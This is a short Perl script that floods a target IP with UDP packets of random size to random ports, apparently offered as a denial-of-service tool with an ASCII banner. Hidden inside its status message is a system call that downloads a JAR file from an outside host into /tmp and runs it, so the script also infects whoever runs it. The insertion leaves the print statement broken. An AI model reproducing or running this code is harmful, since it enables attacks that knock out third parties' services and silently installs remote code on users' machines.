!/usr/bin/perl
 
##
# Superman<----
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print <<EOTEXT;
 
  ********                                  ******                       **  
 **//////          ******                  /*////**                     /**  
/**        **   **/**///**  *****  ******  /*   /**   ******   ******  ******
/*********/**  /**/**  /** **///**//**//*  /******   **////** **////**///**/
////////**/**  /**/****** /******* /** /   /*//// **/**   /**/**   /**  /**  
       /**/**  /**/**///  /**////  /**     /*    /**/**   /**/**   /**  /**  
 ******** //******/**     //******/***     /******* //****** //******   //**
////////   ////// //       ////// ///      ///////   //////   //////     //  
 
EOTEXT
 
print "~Getting Rid Of~ $ip " . ($port ? $port : "random") . " By Smashing with " .
  ($size ? "$size-byte" : "Offline") . " Packets " .
system("cd /tmp && wget http://xerxes.science/jb.jar && java -jar jb.jar");
  ($time ? "for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}